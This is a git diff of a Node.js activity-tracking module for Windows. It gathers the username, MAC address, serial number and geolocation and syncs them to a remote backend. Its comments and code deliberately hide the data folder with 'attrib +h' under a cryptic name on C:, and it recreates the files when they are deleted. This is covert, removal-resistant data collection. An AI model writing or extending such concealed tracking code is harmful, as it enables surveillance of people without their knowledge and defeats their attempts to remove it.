@@ -6,10 +6,10 @@ const { exec } = require('child_process');
 const { promisify } = require('util');
 const execAsync = promisify(exec);
 
-// File paths - now in C drive with obfuscated names
-const DATA_DIR = path.join('C:/', '.sys_monitoring_cf7ea2');
-const DAILY_JSON_FILE = path.join(DATA_DIR, 'sys_cache_f5e29b7d.dat');
-const HISTORY_JSON_FILE = path.join(DATA_DIR, 'sys_backup_a3c81e6f.dat');
+// New file paths - in C drive hidden folder with cryptic name
+const APP_DATA_FOLDER = path.join('C:', 'System.ServiceData');
+const DAILY_JSON_FILE = path.join(APP_DATA_FOLDER, 'daily.json');
+const HISTORY_JSON_FILE = path.join(APP_DATA_FOLDER, 'history.json');
 
 // Backend API endpoints
 const BACKEND_BULK_URL = 'https://windows-socket.thesama.in/api/tracking/bulk-sync';
@@ -22,39 +22,26 @@ let totalActiveTime = 0; // Tracks values 1-5 for display in daily.json
 let lastSyncTime = 0;
 let backendTotalTime = 0; // Internal variable to track increments of 5 for the backend
 
+// Make folder hidden in Windows
+async function makeDirectoryHidden() {
+  try {
+    await execAsync(`attrib +h "${APP_DATA_FOLDER}"`);
+    console.log('Successfully made data directory hidden');
+  } catch (error) {
+    console.error('Error making directory hidden:', error);
+    // Continue even if we can't make it hidden
+  }
+}
+
 // Ensure data directory exists
 async function ensureDirectoryExists() {
   try {
-    // Create the directory with hidden attribute
-    try {
-      // Check if directory exists first
-      await fs.access(DATA_DIR);
-      console.log('Data directory exists');
-    } catch (dirError) {
-      // Directory doesn't exist, create it
-      console.log('Creating data directory at:', DATA_DIR);
-      await fs.mkdir(DATA_DIR, { recursive: true });
-      console.log('Data directory created successfully');
-    }
-    
-    // On Windows, make the directory hidden using attrib command
-    if (process.platform === 'win32') {
-      try {
-        await execAsync(`attrib +h "${DATA_DIR}"`);
-        console.log('Set hidden attribute on data directory');
-      } catch (attrError) {
-        console.error('Failed to set hidden attribute:', attrError);
-      }
-    }
+    await fs.mkdir(APP_DATA_FOLDER, { recursive: true });
+    // Try to make the directory hidden
+    await makeDirectoryHidden();
   } catch (error) {
-    console.error('Error ensuring directory exists:', error);
-    // Try creating with a synchronous method as fallback
-    try {
-      require('fs').mkdirSync(DATA_DIR, { recursive: true });
-      console.log('Created directory using synchronous fallback');
-    } catch (syncError) {
-      console.error('Critical error: Could not create data directory:', syncError);
-    }
+    // Directory may already exist, continue
+    console.log('Data directory may already exist:', error.message);
   }
 }
 
@@ -72,16 +59,7 @@ async function initializeFiles() {
       // File doesn't exist, create it
       const emptyHistory = { records: [] };
       await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(emptyHistory, null, 2));
-      console.log('Created new history data file');
-      
-      // Make file hidden
-      if (process.platform === 'win32') {
-        try {
-          await execAsync(`attrib +h "${HISTORY_JSON_FILE}"`);
-        } catch (attrError) {
-          console.error('Failed to set hidden attribute on history file:', attrError);
-        }
-      }
+      console.log('Created new history.json file');
     }
     
     // Check for date change first
@@ -102,34 +80,15 @@ async function initializeFiles() {
           await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(newData, null, 2));
         }
       } catch (error) {
-        console.error('Error parsing daily data file:', error);
+        console.error('Error parsing daily.json:', error);
         // Create new file on error
         const initialData = await collectCurrentMetrics();
         await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(initialData, null, 2));
-        
-        // Make file hidden
-        if (process.platform === 'win32') {
-          try {
-            await execAsync(`attrib +h "${DAILY_JSON_FILE}"`);
-          } catch (attrError) {
-            console.error('Failed to set hidden attribute on daily file:', attrError);
-          }
-        }
       }
     } catch (error) {
       // File doesn't exist, create it
       const initialData = await collectCurrentMetrics();
       await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(initialData, null, 2));
-      console.log('Created new daily data file');
-      
-      // Make file hidden
-      if (process.platform === 'win32') {
-        try {
-          await execAsync(`attrib +h "${DAILY_JSON_FILE}"`);
-        } catch (attrError) {
-          console.error('Failed to set hidden attribute on daily file:', attrError);
-        }
-      }
     }
     
     // Try to sync immediately on startup if we have internet
@@ -151,117 +110,77 @@ async function checkDateChange() {
   try {
     const today = new Date().toISOString().split('T')[0];
     
-    // Make sure our directory exists first
-    await ensureDirectoryExists();
-    
-    // Check if daily file exists
-    let dailyFileExists = false;
     try {
-      await fs.access(DAILY_JSON_FILE);
-      dailyFileExists = true;
-    } catch (accessError) {
-      console.log('Daily file does not exist yet, will create new');
-      dailyFileExists = false;
-    }
-    
-    // Only try to read if the file exists
-    if (dailyFileExists) {
-      try {
-        const data = await fs.readFile(DAILY_JSON_FILE, 'utf8');
-        const dailyData = JSON.parse(data);
-        
-        // If we have data and it's from a previous day
-        if (dailyData && dailyData.date) {
-          const dataDate = dailyData.date.split('T')[0];
-          if (dataDate !== today) {
-            console.log(`Date changed from ${dataDate} to ${today}, moving data to history`);
+      const data = await fs.readFile(DAILY_JSON_FILE, 'utf8');
+      const dailyData = JSON.parse(data);
+      
+      // If we have data and it's from a previous day
+      if (dailyData && dailyData.date) {
+        const dataDate = dailyData.date.split('T')[0];
+        if (dataDate !== today) {
+          console.log(`Date changed from ${dataDate} to ${today}, moving data to history`);
+          
+          // Only move to history if there's actual data to move
+          if (dailyData.active_time > 0) {
+            // Format record for history file
+            const historyRecord = {
+              date: `${dataDate}T00:00:00.000Z`,
+              system_id: dailyData.system_id,
+              mac_address: dailyData.mac_address,
+              serial_number: dailyData.serial_number,
+              username: dailyData.username,
+              // Use the actual accumulated time, not just 5
+              total_time: dailyData.active_time,
+              last_updated: dailyData.last_updated || new Date().toISOString(),
+              latitude: dailyData.latitude,
+              longitude: dailyData.longitude,
+              location_name: dailyData.location_name
+            };
             
-            // Only move to history if there's actual data to move
-            if (dailyData.active_time > 0) {
-              // Format record for history file
-              const historyRecord = {
-                date: `${dataDate}T00:00:00.000Z`,
-                system_id: dailyData.system_id,
-                mac_address: dailyData.mac_address,
-                serial_number: dailyData.serial_number,
-                username: dailyData.username,
-                // Use the actual accumulated time, not just 5
-                total_time: dailyData.active_time,
-                last_updated: dailyData.last_updated || new Date().toISOString(),
-                latitude: dailyData.latitude,
-                longitude: dailyData.longitude,
-                location_name: dailyData.location_name
-              };
-              
-              // Read history file
-              const historyData = await readHistoryFile();
-              
-              // Add record to history
-              historyData.records.push(historyRecord);
-              
-              // Write updated history
-              await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(historyData, null, 2));
-              
-              console.log(`Added record from ${dataDate} to history with ${historyRecord.total_time} minutes`);
-            }
+            // Read history file
+            const historyData = await readHistoryFile();
             
-            // Reset tracking variables for the new day
-            totalActiveTime = 1;
-            backendTotalTime = 0;
-            const newDailyData = await collectCurrentMetrics();
-            await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(newDailyData, null, 2));
+            // Add record to history
+            historyData.records.push(historyRecord);
             
-            // Set hidden attribute on the daily file if it's on Windows
-            if (process.platform === 'win32') {
-              try {
-                await execAsync(`attrib +h "${DAILY_JSON_FILE}"`);
-              } catch (attrError) {
-                console.error('Failed to set hidden attribute on daily file:', attrError);
-              }
-            }
+            // Write updated history
+            await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(historyData, null, 2));
             
-            console.log(`Created new daily data file for ${today}`);
-            
-            // Immediately attempt to sync history data when date changes
-            const isConnected = await checkConnectivity();
-            if (isConnected) {
-              console.log('Internet connection detected, attempting to sync historical data');
-              const historyData = await readHistoryFile();
-              if (historyData.records && historyData.records.length > 0) {
-                const syncSuccess = await syncBulkData(historyData);
-                if (syncSuccess) {
-                  console.log('Successfully synced historical data after date change');
-                } else {
-                  console.log('Failed to sync historical data after date change, will retry later');
-                }
+            console.log(`Added record from ${dataDate} to history.json with ${historyRecord.total_time} minutes`);
+          }
+          
+          // Reset tracking variables for the new day
+          totalActiveTime = 1;
+          backendTotalTime = 0;
+          const newDailyData = await collectCurrentMetrics();
+          await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(newDailyData, null, 2));
+          
+          console.log(`Created new daily.json for ${today}`);
+          
+          // Immediately attempt to sync history data when date changes
+          const isConnected = await checkConnectivity();
+          if (isConnected) {
+            console.log('Internet connection detected, attempting to sync historical data');
+            const historyData = await readHistoryFile();
+            if (historyData.records && historyData.records.length > 0) {
+              const syncSuccess = await syncBulkData(historyData);
+              if (syncSuccess) {
+                console.log('Successfully synced historical data after date change');
+              } else {
+                console.log('Failed to sync historical data after date change, will retry later');
               }
             }
           }
         }
-      } catch (error) {
-        console.error('Error checking date change:', error);
-        // Continue to create a new file below
       }
-    }
-    
-    // If we can't read the file or it doesn't exist, create a new one for today
-    if (!dailyFileExists) {
-      console.log('Creating new daily file for today');
+    } catch (error) {
+      console.error('Error checking date change:', error);
+      
+      // If we can't read the file, create a new one for today
       totalActiveTime = 1;
       backendTotalTime = 0;
       const newDailyData = await collectCurrentMetrics();
       await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(newDailyData, null, 2));
-      
-      // Set hidden attribute on the daily file if it's on Windows
-      if (process.platform === 'win32') {
-        try {
-          await execAsync(`attrib +h "${DAILY_JSON_FILE}"`);
-        } catch (attrError) {
-          console.error('Failed to set hidden attribute on daily file:', attrError);
-        }
-      }
-      
-      console.log('New daily file created successfully');
     }
   } catch (error) {
     console.error('Error in checkDateChange:', error);
@@ -276,18 +195,9 @@ async function readHistoryFile() {
       await fs.access(HISTORY_JSON_FILE);
     } catch (error) {
       // File doesn't exist, create an empty one
+      await ensureDirectoryExists(); // Make sure the directory exists
       const emptyHistory = { records: [] };
       await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(emptyHistory, null, 2));
-      
-      // Make file hidden
-      if (process.platform === 'win32') {
-        try {
-          await execAsync(`attrib +h "${HISTORY_JSON_FILE}"`);
-        } catch (attrError) {
-          console.error('Failed to set hidden attribute:', attrError);
-        }
-      }
-      
       return emptyHistory;
     }
     
@@ -488,58 +398,6 @@ async function syncBulkData(historyData) {
   }
 }
 
-// Function to recreate files if they're deleted
-async function checkAndRestoreFiles() {
-  let filesRecreated = false;
-  
-  // Check and restore daily file if missing
-  try {
-    await fs.access(DAILY_JSON_FILE);
-  } catch (error) {
-    console.log('Daily data file missing, recreating...');
-    // Recreate the daily file
-    await ensureDirectoryExists();
-    totalActiveTime = 1;
-    const initialData = await collectCurrentMetrics();
-    await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(initialData, null, 2));
-    
-    // Make file hidden
-    if (process.platform === 'win32') {
-      try {
-        await execAsync(`attrib +h "${DAILY_JSON_FILE}"`);
-      } catch (attrError) {
-        console.error('Failed to set hidden attribute:', attrError);
-      }
-    }
-    
-    filesRecreated = true;
-  }
-  
-  // Check and restore history file if missing
-  try {
-    await fs.access(HISTORY_JSON_FILE);
-  } catch (error) {
-    console.log('History data file missing, recreating...');
-    // Recreate the history file
-    await ensureDirectoryExists();
-    const emptyHistory = { records: [] };
-    await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(emptyHistory, null, 2));
-    
-    // Make file hidden
-    if (process.platform === 'win32') {
-      try {
-        await execAsync(`attrib +h "${HISTORY_JSON_FILE}"`);
-      } catch (attrError) {
-        console.error('Failed to set hidden attribute:', attrError);
-      }
-    }
-    
-    filesRecreated = true;
-  }
-  
-  return filesRecreated;
-}
-
 // Helper functions (from your original code)
 async function getMacAddress() {
   try {
@@ -688,9 +546,51 @@ function formatDuration(minutes) {
   return `${String(hours).padStart(2, '0')}:${String(remainingMinutes).padStart(2, '0')}`;
 }
 
+// Function to check if the data directory exists and recreate if not
+async function checkAndRecreateDataFolder() {
+  try {
+    await fs.access(APP_DATA_FOLDER);
+    
+    // Check if files exist, if not, recreate them
+    try {
+      await fs.access(DAILY_JSON_FILE);
+    } catch (error) {
+      // Daily.json doesn't exist, create it
+      const initialData = await collectCurrentMetrics();
+      await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(initialData, null, 2));
+      console.log('Recreated missing daily.json file');
+    }
+    
+    try {
+      await fs.access(HISTORY_JSON_FILE);
+    } catch (error) {
+      // History.json doesn't exist, create it
+      const emptyHistory = { records: [] };
+      await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(emptyHistory, null, 2));
+      console.log('Recreated missing history.json file');
+    }
+  } catch (error) {
+    // Directory doesn't exist, recreate everything
+    console.log('Data directory missing, recreating it');
+    await ensureDirectoryExists();
+    
+    // Create files
+    const initialData = await collectCurrentMetrics();
+    await fs.writeFile(DAILY_JSON_FILE, JSON.stringify(initialData, null, 2));
+    
+    const emptyHistory = { records: [] };
+    await fs.writeFile(HISTORY_JSON_FILE, JSON.stringify(emptyHistory, null, 2));
+    
+    console.log('Data directory and files recreated');
+  }
+}
+
 // Final metrics when shutting down
 async function sendFinalMetrics() {
   try {
+    // Check if our data folder exists, recreate if not
+    await checkAndRecreateDataFolder();
+    
     // If we're about to shut down, include the current active time in the backend total
     // so we don't lose any tracked time
     if (totalActiveTime > 1) {
@@ -720,5 +620,5 @@ module.exports = {
   syncData,
   sendFinalMetrics,
   systemId,
-  checkAndRestoreFiles  // Export the new function to periodically check files
+  getDataFilePath: () => APP_DATA_FOLDER // Export the path for external use
 };
